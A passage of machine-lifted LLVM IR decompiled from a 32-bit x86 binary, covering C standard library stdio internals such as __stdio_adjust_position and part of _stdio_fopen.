  store i32 %v3_80568e3, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v2_80568e8 = add i32 %v0_80568e3, 16
  %v3_80568e8 = inttoptr i32 %v2_80568e8 to i32*
  store i32 %v3_80568e3, i32* %v3_80568e8, align 4
  %v0_80568eb = load i32, i32* %eax.global-to-local, align 4
  %v1_80568eb = load i32, i32* @esi, align 4
  %v2_80568eb = add i32 %v1_80568eb, 20
  %v3_80568eb = inttoptr i32 %v2_80568eb to i32*
  store i32 %v0_80568eb, i32* %v3_80568eb, align 4
  %v0_80568ee = load i32, i32* %eax.global-to-local, align 4
  %v1_80568ee = load i32, i32* @esi, align 4
  %v2_80568ee = add i32 %v1_80568ee, 24
  %v3_80568ee = inttoptr i32 %v2_80568ee to i32*
  store i32 %v0_80568ee, i32* %v3_80568ee, align 4
  %v0_80568f1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80568f1 = load i32, i32* @esi, align 4
  %v2_80568f1 = add i32 %v1_80568f1, 28
  %v3_80568f1 = inttoptr i32 %v2_80568f1 to i32*
  store i32 %v0_80568f1, i32* %v3_80568f1, align 4
  %v0_80568f4 = load i32, i32* @esi, align 4
  %v1_80568f4 = add i32 %v0_80568f4, 44
  %v2_80568f4 = inttoptr i32 %v1_80568f4 to i32*
  store i32 0, i32* %v2_80568f4, align 4
  %v0_80568fb = load i32, i32* @esi, align 4
  %v1_80568fb = add i32 %v0_80568fb, 2
  %v2_80568fb = inttoptr i32 %v1_80568fb to i8*
  store i8 0, i8* %v2_80568fb, align 1
  br label %dec_label_pc_8056904

dec_label_pc_8056901:                             ; preds = %dec_label_pc_80568cb, %dec_label_pc_80568b7, %dec_label_pc_80568a2
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056904

dec_label_pc_8056904:                             ; preds = %dec_label_pc_80568df, %dec_label_pc_8056901
  br i1 %v1_805687c, label %dec_label_pc_8056919, label %dec_label_pc_8056908

dec_label_pc_8056908:                             ; preds = %dec_label_pc_8056904
  %v2_805690c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_805690c, i32* @eax, align 4
  %v3_8056911 = call i32 @__pthread_return_void(i32 %v2_805690c, i32 1)
  store i32 %v3_8056911, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056919

dec_label_pc_8056919:                             ; preds = %dec_label_pc_8056904, %dec_label_pc_8056864, %dec_label_pc_8056908
  %v0_805691c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805691c, i32* %eax.global-to-local, align 4
  store i32 %v0_8056843, i32* @ebx, align 4
  store i32 %v0_8056842, i32* @esi, align 4
  store i32 %v0_8056841, i32* @edi, align 4
  store i32 %v0_8056840, i32* @ebp, align 4
  ret i32 %v0_805691c

; uselistorder directives
  uselistorder i32 %v2_80568cd.pre-phi, { 1, 0 }
  uselistorder i32 %v0_80568b2, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8056919, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056904, { 1, 0 }
  uselistorder label %dec_label_pc_80568cb, { 1, 0 }
  uselistorder label %dec_label_pc_805689d, { 1, 0 }
}

define i32 @__stdio_adjust_position(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8056934 = load i32, i32* %arg1, align 4
  store i32 %v2_8056934, i32* %esi.global-to-local, align 4
  %v1_805693b = urem i32 %v2_8056934, 4
  %v2_805693b = icmp eq i32 %v1_805693b, 0
  store i32 %v1_805693b, i32* %ecx.global-to-local, align 4
  br i1 %v2_805693b, label %dec_label_pc_805696a, label %dec_label_pc_8056940

dec_label_pc_8056940:                             ; preds = %entry
  %v1_8056942 = add nsw i32 %v1_805693b, -1
  %v8_8056942 = icmp eq i32 %v1_8056942, 0
  store i32 %v1_8056942, i32* @edx, align 4
  br i1 %v8_8056942, label %dec_label_pc_805696a, label %dec_label_pc_8056945

dec_label_pc_8056945:                             ; preds = %dec_label_pc_8056940
  %v3_8056945 = and i32 %v2_8056934, 2048
  %v4_8056945 = icmp eq i32 %v3_8056945, 0
  br i1 %v4_8056945, label %dec_label_pc_805696a, label %dec_label_pc_805694a

dec_label_pc_805694a:                             ; preds = %dec_label_pc_8056945
  %v6_805694a = sub nsw i32 1, %v1_805693b
  %v7_805694a = and i32 %v1_8056942, %v6_805694a
  %v8_805694a = icmp slt i32 %v7_805694a, 0
  %v9_805694a = icmp eq i32 %v1_805693b, 2
  %v10_805694a = icmp ult i32 %v1_805693b, 2
  %v3_805694d = icmp eq i1 %v10_805694a, %v8_805694a
  %v4_805694d = icmp eq i1 %v9_805694a, false
  %v5_805694d = and i1 %v4_805694d, %v3_805694d
  br i1 %v5_805694d, label %dec_label_pc_80569c0, label %dec_label_pc_805694f

dec_label_pc_805694f:                             ; preds = %dec_label_pc_805694a
  %v1_805694f = add i32 %tmp6, 40
  %v2_805694f = inttoptr i32 %v1_805694f to i32*
  %v3_805694f = load i32, i32* %v2_805694f, align 4
  %v4_805694f = icmp eq i32 %v3_805694f, 0
  %v1_8056953 = icmp eq i1 %v4_805694f, false
  br i1 %v1_8056953, label %dec_label_pc_80569c0, label %dec_label_pc_8056955

dec_label_pc_8056955:                             ; preds = %dec_label_pc_805694f
  %v1_8056955 = add i32 %tmp6, 3
  %v2_8056955 = inttoptr i32 %v1_8056955 to i8*
  %v3_8056955 = load i8, i8* %v2_8056955, align 1
  %v4_8056955 = zext i8 %v3_8056955 to i32
  %v2_8056959 = sub nsw i32 %v1_8056942, %v4_8056955
  %v1_805695b = add i32 %tmp6, 44
  %v2_805695b = inttoptr i32 %v1_805695b to i32*
  %v3_805695b = load i32, i32* %v2_805695b, align 4
  %v1_805695f = add nsw i32 %v2_8056959, -1
  %tmp12 = icmp slt i32 %v3_805695b, 1
  br i1 %tmp12, label %dec_label_pc_805696a, label %dec_label_pc_8056964

dec_label_pc_8056964:                             ; preds = %dec_label_pc_8056955
  %v1_8056964 = add i32 %tmp6, 2
  %v2_8056964 = inttoptr i32 %v1_8056964 to i8*
  %v3_8056964 = load i8, i8* %v2_8056964, align 1
  %v4_8056964 = zext i8 %v3_8056964 to i32
  %v2_8056968 = sub nsw i32 %v1_805695f, %v4_8056964
  br label %dec_label_pc_805696a

dec_label_pc_805696a:                             ; preds = %dec_label_pc_8056955, %dec_label_pc_8056945, %dec_label_pc_8056940, %entry, %dec_label_pc_8056964
  %v0_8056981 = phi i32 [ %v1_805695f, %dec_label_pc_8056955 ], [ %v1_8056942, %dec_label_pc_8056945 ], [ 0, %dec_label_pc_8056940 ], [ 0, %entry ], [ %v2_8056968, %dec_label_pc_8056964 ]
  %v2_805696a = and i32 %v2_8056934, 64
  %v3_805696a = icmp eq i32 %v2_805696a, 0
  %storemerge.in.in.v = select i1 %v3_805696a, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp6
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8056979 = add i32 %tmp6, 16
  %v3_8056979 = inttoptr i32 %v2_8056979 to i32*
  %v4_8056979 = load i32, i32* %v3_8056979, align 4
  %v5_8056979 = sub i32 %storemerge, %v4_8056979
  %v1_805697c = inttoptr i32 %arg2 to i32*
  %v2_805697c = load i32, i32* %v1_805697c, align 4
  store i32 %v2_805697c, i32* %ecx.global-to-local, align 4
  %v1_805697e = add i32 %arg2, 4
  %v2_805697e = inttoptr i32 %v1_805697e to i32*
  %v3_805697e = load i32, i32* %v2_805697e, align 4
  store i32 %v3_805697e, i32* %ebx.global-to-local, align 4
  %v2_8056981 = add i32 %v5_8056979, %v0_8056981
  store i32 %v2_8056981, i32* %esi.global-to-local, align 4
  %v2_805698c = ashr i32 %v2_8056981, 31
  %v5_8056995 = sub i32 %v2_805697c, %v2_8056981
  %v10_8056995 = icmp ult i32 %v2_805697c, %v2_8056981
  %v6_8056999 = zext i1 %v10_8056995 to i32
  %tmp = icmp slt i32 %v2_8056981, 0
  %v2_805698c.neg = zext i1 %tmp to i32
  %v7_8056999 = add i32 %v3_805697e, %v2_805698c.neg
  %v8_8056999 = add i32 %v7_8056999, %v6_8056999
  store i32 %v8_8056999, i32* @edx, align 4
  store i32 %v5_8056995, i32* %v1_805697c, align 4
  %v0_805699f = load i32, i32* @edx, align 4
  %v1_805699f = load i32, i32* %edi.global-to-local, align 4
  %v2_805699f = add i32 %v1_805699f, 4
  %v3_805699f = inttoptr i32 %v2_805699f to i32*
  store i32 %v0_805699f, i32* %v3_805699f, align 4
  %v0_80569a2 = load i32, i32* %edi.global-to-local, align 4
  %v1_80569a2 = add i32 %v0_80569a2, 4
  %v2_80569a2 = inttoptr i32 %v1_80569a2 to i32*
  %v3_80569a2 = load i32, i32* %v2_80569a2, align 4
  %v4_80569a2 = load i32, i32* %ebx.global-to-local, align 4
  %v5_80569a5 = icmp slt i32 %v3_80569a2, %v4_80569a2
  br i1 %v5_80569a5, label %dec_label_pc_80569af, label %dec_label_pc_80569a7

dec_label_pc_80569a7:                             ; preds = %dec_label_pc_805696a
  %v8_80569a7 = icmp sgt i32 %v3_80569a2, %v4_80569a2
  br i1 %v8_80569a7, label %dec_label_pc_80569ad, label %dec_label_pc_80569a9

dec_label_pc_80569a9:                             ; preds = %dec_label_pc_80569a7
  %v1_80569a9 = inttoptr i32 %v0_80569a2 to i32*
  %v2_80569a9 = load i32, i32* %v1_80569a9, align 4
  %v3_80569a9 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_80569a9, %v3_80569a9
  br i1 %tmp14, label %dec_label_pc_80569ad, label %dec_label_pc_80569af

dec_label_pc_80569ad:                             ; preds = %dec_label_pc_80569a9, %dec_label_pc_80569a7
  %v0_80569ad = load i32, i32* %esi.global-to-local, align 4
  %v1_80569ad = sub i32 0, %v0_80569ad
  store i32 %v1_80569ad, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80569af

dec_label_pc_80569af:                             ; preds = %dec_label_pc_80569a9, %dec_label_pc_805696a, %dec_label_pc_80569ad
  %v0_80569af = load i32, i32* %esi.global-to-local, align 4
  %v2_80569af = icmp slt i32 %v0_80569af, 0
  %v1_80569b1 = icmp eq i1 %v2_80569af, false
  br i1 %v1_80569b1, label %dec_label_pc_80569c3, label %dec_label_pc_80569b3

dec_label_pc_80569b3:                             ; preds = %dec_label_pc_80569af
  %v1_80569b3 = call i32 @__errno_location(i32 %v2_805698c)
  %v1_80569b8 = inttoptr i32 %v1_80569b3 to i32*
  store i32 75, i32* %v1_80569b8, align 4
  %v0_80569c6.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80569c3

dec_label_pc_80569c0:                             ; preds = %dec_label_pc_805694f, %dec_label_pc_805694a
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80569c3

dec_label_pc_80569c3:                             ; preds = %dec_label_pc_80569af, %dec_label_pc_80569b3, %dec_label_pc_80569c0
  %v0_80569c6 = phi i32 [ %v0_80569af, %dec_label_pc_80569af ], [ %v0_80569c6.pre, %dec_label_pc_80569b3 ], [ -1, %dec_label_pc_80569c0 ]
  ret i32 %v0_80569c6

; uselistorder directives
  uselistorder i32 %v4_80569a2, { 1, 0 }
  uselistorder i32 %v3_80569a2, { 1, 0 }
  uselistorder i32 %v1_8056942, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_805693b, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_8056934, { 2, 1, 0, 3 }
  uselistorder i32 %tmp6, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 4, 2, 1, 3, 5, 6 }
  uselistorder i32 75, { 3, 2, 1, 0 }
  uselistorder i32 2048, { 4, 3, 8, 5, 7, 0, 1, 2, 10, 6, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80569c3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80569af, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805696a, { 4, 0, 1, 2, 3 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80569cc = load i32, i32* @ebp, align 4
  %v0_80569cd = load i32, i32* @edi, align 4
  %v0_80569ce = load i32, i32* @esi, align 4
  %v0_80569cf = load i32, i32* @ebx, align 4
  store i32 %v0_80569cf, i32* %stack_var_-16, align 4
  %v4_80569d3 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80569d3, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_80569e3 = load i8, i8* %arg2, align 1
  %v3_80569e3 = zext i8 %v2_80569e3 to i32
  %v4_80569e3 = load i32, i32* @eax, align 4
  %v5_80569e3 = and i32 %v4_80569e3, -256
  %v6_80569e3 = or i32 %v5_80569e3, %v3_80569e3
  store i32 %v6_80569e3, i32* %eax.global-to-local, align 4
  %v10_80569e5 = icmp eq i8 %v2_80569e3, 114
  br i1 %v10_80569e5, label %dec_label_pc_8056a27, label %dec_label_pc_80569e9

dec_label_pc_80569e9:                             ; preds = %entry
  store i32 577, i32* @ebx, align 4
  %v10_80569ee = icmp eq i8 %v2_80569e3, 119
  br i1 %v10_80569ee, label %dec_label_pc_8056a29, label %dec_label_pc_80569f2

dec_label_pc_80569f2:                             ; preds = %dec_label_pc_80569e9
  store i32 1089, i32* @ebx, align 4
  %v10_80569f6 = icmp eq i8 %v2_80569e3, 97
  br i1 %v10_80569f6, label %dec_label_pc_8056a29, label %dec_label_pc_80569fa

dec_label_pc_80569fa:                             ; preds = %dec_label_pc_8056aa2, %dec_label_pc_8056a7c, %dec_label_pc_80569f2
  %v0_80569fa = load i32, i32* %stack_var_-16, align 4
  %v1_80569fa = call i32 @__errno_location(i32 %v0_80569fa)
  store i32 %v1_80569fa, i32* %eax.global-to-local, align 4
  %v0_80569ff = load i32, i32* @ebp, align 4
  %v1_80569ff = icmp eq i32 %v0_80569ff, 0
  %v1_8056a01 = inttoptr i32 %v1_80569fa to i32*
  store i32 22, i32* %v1_8056a01, align 4
  br i1 %v1_80569ff, label %dec_label_pc_8056bef, label %dec_label_pc_8056a0d

dec_label_pc_8056a0d:                             ; preds = %dec_label_pc_8056acb, %dec_label_pc_80569fa
  %v0_8056a0d = load i32, i32* @ebp, align 4
  %v1_8056a0d = add i32 %v0_8056a0d, 1
  %v2_8056a0d = inttoptr i32 %v1_8056a0d to i8*
  %v3_8056a0d = load i8, i8* %v2_8056a0d, align 1
  %v4_8056a0d = and i8 %v3_8056a0d, 32
  %v5_8056a0d = icmp eq i8 %v4_8056a0d, 0
  br i1 %v5_8056a0d, label %dec_label_pc_8056bef, label %dec_label_pc_8056a17

dec_label_pc_8056a17:                             ; preds = %dec_label_pc_8056a0d
  store i32 %v0_8056a0d, i32* %stack_var_-76, align 4
  %v1_8056a1b = call i32 @free(i32 %v0_8056a0d)
  store i32 %v1_8056a1b, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8056bea

dec_label_pc_8056a27:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8056a29

dec_label_pc_8056a29:                             ; preds = %dec_label_pc_80569f2, %dec_label_pc_80569e9, %dec_label_pc_8056a27
  %v0_8056a3a = phi i32 [ 1089, %dec_label_pc_80569f2 ], [ 577, %dec_label_pc_80569e9 ], [ 1, %dec_label_pc_8056a27 ]
  %v1_8056a29 = add i32 %v4_80569d3, 1
  store i32 %v1_8056a29, i32* %eax.global-to-local, align 4
  %v2_8056a2c = inttoptr i32 %v1_8056a29 to i8*
  %v3_8056a2c = load i8, i8* %v2_8056a2c, align 1
  %v12_8056a2c = icmp eq i8 %v3_8056a2c, 98
  br i1 %v12_8056a2c, label %dec_label_pc_8056a34, label %dec_label_pc_8056a32

dec_label_pc_8056a32:                             ; preds = %dec_label_pc_8056a29
  store i32 %v4_80569d3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056a34

dec_label_pc_8056a34:                             ; preds = %dec_label_pc_8056a29, %dec_label_pc_8056a32
  %v0_8056a34 = phi i32 [ %v1_8056a29, %dec_label_pc_8056a29 ], [ %v4_80569d3, %dec_label_pc_8056a32 ]
  %v1_8056a34 = add i32 %v0_8056a34, 1
  %v2_8056a34 = inttoptr i32 %v1_8056a34 to i8*
  %v3_8056a34 = load i8, i8* %v2_8056a34, align 1
  %v12_8056a34 = icmp eq i8 %v3_8056a34, 43
  %v1_8056a38 = icmp eq i1 %v12_8056a34, false
  br i1 %v1_8056a38, label %dec_label_pc_8056a42, label %dec_label_pc_8056a3a

dec_label_pc_8056a3a:                             ; preds = %dec_label_pc_8056a34
  store i32 %v0_8056a3a, i32* %eax.global-to-local, align 4
  %v1_8056a3f = add nuw nsw i32 %v0_8056a3a, 1
  store i32 %v1_8056a3f, i32* @ebx, align 4
  br label %dec_label_pc_8056a42

dec_label_pc_8056a42:                             ; preds = %dec_label_pc_8056a34, %dec_label_pc_8056a3a
  %v1_8056a42 = icmp eq i32 %arg3, 0
  %v1_8056a44 = icmp eq i1 %v1_8056a42, false
  br i1 %v1_8056a44, label %dec_label_pc_8056a78, label %dec_label_pc_8056a46

dec_label_pc_8056a46:                             ; preds = %dec_label_pc_8056a42
  store i32 80, i32* %stack_var_-76, align 4
  %v1_8056a4b = call i32 @malloc(i32 80)
  store i32 %v1_8056a4b, i32* %eax.global-to-local, align 4
  store i32 %v1_8056a4b, i32* @ebp, align 4
  %v2_8056a55 = icmp eq i32 %v1_8056a4b, 0
  br i1 %v2_8056a55, label %dec_label_pc_8056bf1, label %dec_label_pc_8056a5d

dec_label_pc_8056a5d:                             ; preds = %dec_label_pc_8056a46
  %v2_8056a4b = inttoptr i32 %v1_8056a4b to i16*
  store i16 8192, i16* %v2_8056a4b, align 2
  %v2_8056a65 = add i32 %v1_8056a4b, 8
  %v3_8056a65 = inttoptr i32 %v2_8056a65 to i32*
  store i32 0, i32* %v3_8056a65, align 4
  %v2_8056a6c = add i32 %v1_8056a4b, 56
  store i32 %v2_8056a6c, i32* %eax.global-to-local, align 4
  store i32 %v2_8056a6c, i32* %stack_var_-76, align 4
  %v1_8056a70 = call i32 @__stdio_init_mutex(i32 %v2_8056a6c)
  store i32 %v1_8056a70, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056a78

dec_label_pc_8056a78:                             ; preds = %dec_label_pc_8056a42, %dec_label_pc_8056a5d
  %v2_8056a78 = icmp slt i32 %arg4, 0
  br i1 %v2_8056a78, label %dec_label_pc_8056ac5, label %dec_label_pc_8056a7c

dec_label_pc_8056a7c:                             ; preds = %dec_label_pc_8056a78
  %v0_8056a7c = load i32, i32* @ebx, align 4
  %v0_8056a7e = load i32, i32* @esi, align 4
  %v1_8056a7e = add i32 %v0_8056a7e, 1
  store i32 %v1_8056a7e, i32* %eax.global-to-local, align 4
  %v1_8056a81 = and i32 %v0_8056a7c, 32771
  store i32 %v1_8056a81, i32* %edx.global-to-local, align 4
  %v1_8056a87 = load i32, i32* @ebp, align 4
  %v2_8056a87 = add i32 %v1_8056a87, 4
  %v3_8056a87 = inttoptr i32 %v2_8056a87 to i32*
  store i32 %arg4, i32* %v3_8056a87, align 4
  %v0_8056a8a = load i32, i32* %edx.global-to-local, align 4
  %v1_8056a8a = add i32 %v0_8056a8a, 1
  store i32 %v1_8056a8a, i32* @edx, align 4
  %v0_8056a8b = load i32, i32* %eax.global-to-local, align 4
  %v2_8056a8b = and i32 %v0_8056a8b, %v1_8056a8a
  store i32 %v2_8056a8b, i32* %eax.global-to-local, align 4
  %v12_8056a8d = icmp eq i32 %v2_8056a8b, %v1_8056a8a
  %v1_8056a8f = icmp eq i1 %v12_8056a8d, false
  br i1 %v1_8056a8f, label %dec_label_pc_80569fa, label %dec_label_pc_8056a95

dec_label_pc_8056a95:                             ; preds = %dec_label_pc_8056a7c
  %v0_8056a95 = load i32, i32* @esi, align 4
  %v1_8056a97 = and i32 %v0_8056a95, 1024
  %v1_8056a99 = xor i32 %v1_8056a97, 1024
  store i32 %v1_8056a99, i32* %eax.global-to-local, align 4
  %v1_8056a9e = load i32, i32* @ebx, align 4
  %v2_8056a9e = and i32 %v1_8056a9e, %v1_8056a99
  %v3_8056a9e = icmp eq i32 %v2_8056a9e, 0
  br i1 %v3_8056a9e, label %dec_label_pc_8056a95.dec_label_pc_8056abb_crit_edge, label %dec_label_pc_8056aa2

dec_label_pc_8056a95.dec_label_pc_8056abb_crit_edge: ; preds = %dec_label_pc_8056a95
  br label %dec_label_pc_8056abb

dec_label_pc_8056aa2:                             ; preds = %dec_label_pc_8056a95
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_8056aab = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_8056aab, i32* %eax.global-to-local, align 4
  %v1_8056ab3 = icmp eq i32 %v3_8056aab, 0
  %v1_8056ab5 = icmp eq i1 %v1_8056ab3, false
  br i1 %v1_8056ab5, label %dec_label_pc_80569fa, label %dec_label_pc_8056aa2.dec_label_pc_8056abb_crit_edge

dec_label_pc_8056aa2.dec_label_pc_8056abb_crit_edge: ; preds = %dec_label_pc_8056aa2
  %v0_8056abb.pre = load i32, i32* @esi, align 4
  %v0_8056ac1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056abb

dec_label_pc_8056abb:                             ; preds = %dec_label_pc_8056a95.dec_label_pc_8056abb_crit_edge, %dec_label_pc_8056aa2.dec_label_pc_8056abb_crit_edge
  %v0_8056ac1 = phi i32 [ %v1_8056a9e, %dec_label_pc_8056a95.dec_label_pc_8056abb_crit_edge ], [ %v0_8056ac1.pre, %dec_label_pc_8056aa2.dec_label_pc_8056abb_crit_edge ]
  %v0_8056abb = phi i32 [ %v0_8056a95, %dec_label_pc_8056a95.dec_label_pc_8056abb_crit_edge ], [ %v0_8056abb.pre, %dec_label_pc_8056aa2.dec_label_pc_8056abb_crit_edge ]
  %v1_8056abb = and i32 %v0_8056abb, 32768
  %v2_8056ac1 = or i32 %v1_8056abb, %v0_8056ac1
  store i32 %v2_8056ac1, i32* @ebx, align 4
  br label %dec_label_pc_8056ae6

dec_label_pc_8056ac5:                             ; preds = %dec_label_pc_8056a78
  %v1_8056ac5 = add i32 %arg4, 1
  %v8_8056ac5 = icmp eq i32 %v1_8056ac5, 0
  store i32 %v1_8056ac5, i32* @edi, align 4
  %v0_8056ad1.pre = load i32, i32* @ebx, align 4
  br i1 %v8_8056ac5, label %dec_label_pc_8056acb, label %dec_label_pc_8056ac8

dec_label_pc_8056ac8:                             ; preds = %dec_label_pc_8056ac5
  %v11_8056ac8 = or i32 %v0_8056ad1.pre, 32768
  store i32 %v11_8056ac8, i32* @ebx, align 4
  br label %dec_label_pc_8056acb

dec_label_pc_8056acb:                             ; preds = %dec_label_pc_8056ac5, %dec_label_pc_8056ac8
  %v0_8056ad1 = phi i32 [ %v11_8056ac8, %dec_label_pc_8056ac8 ], [ %v0_8056ad1.pre, %dec_label_pc_8056ac5 ]
  %v0_8056ad2 = load i32, i32* @esi, align 4
  store i32 %v0_8056ad2, i32* %stack_var_-76, align 4
  %v3_8056ad3 = inttoptr i32 %v0_8056ad2 to i8*
  %v4_8056ad3 = call i32 @__libc_open(i8* %v3_8056ad3, i32 %v0_8056ad1)
  store i32 %v4_8056ad3, i32* %eax.global-to-local, align 4
  %v1_8056adb = load i32, i32* @ebp, align 4
  %v2_8056adb = add i32 %v1_8056adb, 4
  %v3_8056adb = inttoptr i32 %v2_8056adb to i32*
  store i32 %v4_8056ad3, i32* %v3_8056adb, align 4
  %v2_8056ade = icmp slt i32 %v4_8056ad3, 0
  br i1 %v2_8056ade, label %dec_label_pc_8056a0d, label %dec_label_pc_8056ae6

dec_label_pc_8056ae6:                             ; preds = %dec_label_pc_8056acb, %dec_label_pc_8056abb
  %v0_8056ae6 = load i32, i32* @ebp, align 4
  %v1_8056ae6 = inttoptr i32 %v0_8056ae6 to i16*
  %v2_8056ae6 = load i16, i16* %v1_8056ae6, align 2
  %v3_8056ae6 = and i16 %v2_8056ae6, 8192
  store i16 %v3_8056ae6, i16* %v1_8056ae6, align 2
  %v0_8056aec = load i32, i32* @ebx, align 4
  %v8_8056aee = and i32 %v0_8056aec, -31744
  %v1_8056af3 = urem i32 %v0_8056aec, 4
  %v1_8056af6 = add nuw nsw i32 %v1_8056af3, 1
  store i32 %v1_8056af6, i32* %eax.global-to-local, align 4
  %v1_8056af7 = load i32, i32* @ebp, align 4
  %v2_8056af7 = inttoptr i32 %v1_8056af7 to i32*
  %v3_8056af7 = load i32, i32* %v2_8056af7, align 4
  %v4_8056af7 = or i32 %v3_8056af7, %v8_8056aee
  %v1_8056afa = mul nuw nsw i32 %v1_8056af6, 16
  %v2_8056afd = xor i32 %v1_8056afa, 48
  store i32 %v2_8056afd, i32* %eax.global-to-local, align 4
  %v2_8056b00 = or i32 %v4_8056af7, %v2_8056afd
  store i32 %v2_8056b00, i32* @ebx, align 4
  %v1_8056b02 = trunc i32 %v2_8056b00 to i16
  %v3_8056b02 = inttoptr i32 %v1_8056af7 to i16*
  store i16 %v1_8056b02, i16* %v3_8056b02, align 2
  %v0_8056b06 = load i32, i32* %stack_var_-76, align 4
  %v1_8056b06 = call i32 @__errno_location(i32 %v0_8056b06)
  store i32 %v1_8056b06, i32* %eax.global-to-local, align 4
  store i32 %v1_8056b06, i32* @esi, align 4
  %v1_8056b10 = inttoptr i32 %v1_8056b06 to i32*
  %v2_8056b10 = load i32, i32* %v1_8056b10, align 4
  store i32 %v2_8056b10, i32* @edi, align 4
  %v0_8056b12 = load i32, i32* @ebp, align 4
  %v1_8056b12 = add i32 %v0_8056b12, 4
  %v2_8056b12 = inttoptr i32 %v1_8056b12 to i32*
  %v3_8056b12 = load i32, i32* %v2_8056b12, align 4
  store i32 %v3_8056b12, i32* %stack_var_-76, align 4
  %v1_8056b15 = call i32 @isatty(i32 %v3_8056b12)
  %v2_8056b1d = mul i32 %v1_8056b15, 256
  store i32 %v2_8056b1d, i32* %eax.global-to-local, align 4
  %v0_8056b20 = load i32, i32* @ebx, align 4
  %v2_8056b20 = or i32 %v0_8056b20, %v2_8056b1d
  store i32 %v2_8056b20, i32* @ebx, align 4
  %v1_8056b22 = trunc i32 %v2_8056b20 to i16
  %v2_8056b22 = load i32, i32* @ebp, align 4
  %v3_8056b22 = inttoptr i32 %v2_8056b22 to i16*
  store i16 %v1_8056b22, i16* %v3_8056b22, align 2
  %v0_8056b26 = load i32, i32* @edi, align 4
  %v1_8056b26 = load i32, i32* @esi, align 4
  %v2_8056b26 = inttoptr i32 %v1_8056b26 to i32*
  store i32 %v0_8056b26, i32* %v2_8056b26, align 4
  %v0_8056b28 = load i32, i32* @ebp, align 4
  %v1_8056b28 = add i32 %v0_8056b28, 8
  %v2_8056b28 = inttoptr i32 %v1_8056b28 to i32*
  %v3_8056b28 = load i32, i32* %v2_8056b28, align 4
  %v4_8056b28 = icmp eq i32 %v3_8056b28, 0
  %v1_8056b2c = icmp eq i1 %v4_8056b28, false
  br i1 %v1_8056b2c, label %dec_label_pc_8056b5c, label %dec_label_pc_8056b2e

dec_label_pc_8056b2e:                             ; preds = %dec_label_pc_8056ae6
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_8056b36 = call i32 @malloc(i32 4096)
  store i32 %v1_8056b36, i32* %eax.global-to-local, align 4
  %v1_8056b3e = load i32, i32* @ebp, align 4
  %v2_8056b3e = add i32 %v1_8056b3e, 8
  %v3_8056b3e = inttoptr i32 %v2_8056b3e to i32*
  store i32 %v1_8056b36, i32* %v3_8056b3e, align 4
  %v1_8056b41 = icmp eq i32 %v1_8056b36, 0
  %v0_8056b55 = load i32, i32* @ebp, align 4
  br i1 %v1_8056b41, label %dec_label_pc_8056b55, label %dec_label_pc_8056b45

dec_label_pc_8056b45:                             ; preds = %dec_label_pc_8056b2e
  %v1_8056b45 = inttoptr i32 %v0_8056b55 to i16*
  %v2_8056b45 = load i16, i16* %v1_8056b45, align 2
  %v3_8056b45 = or i16 %v2_8056b45, 16384
  store i16 %v3_8056b45, i16* %v1_8056b45, align 2
  %v1_8056b4b = add i32 %v1_8056b36, 4096
  store i32 %v1_8056b4b, i32* %eax.global-to-local, align 4
  %v1_8056b50 = load i32, i32* @ebp, align 4
  %v2_8056b50 = add i32 %v1_8056b50, 12
  %v3_8056b50 = inttoptr i32 %v2_8056b50 to i32*
  store i32 %v1_8056b4b, i32* %v3_8056b50, align 4
  br label %dec_label_pc_8056b5c

dec_label_pc_8056b55:                             ; preds = %dec_label_pc_8056b2e
  %v1_8056b55 = add i32 %v0_8056b55, 12
  %v2_8056b55 = inttoptr i32 %v1_8056b55 to i32*
  store i32 0, i32* %v2_8056b55, align 4
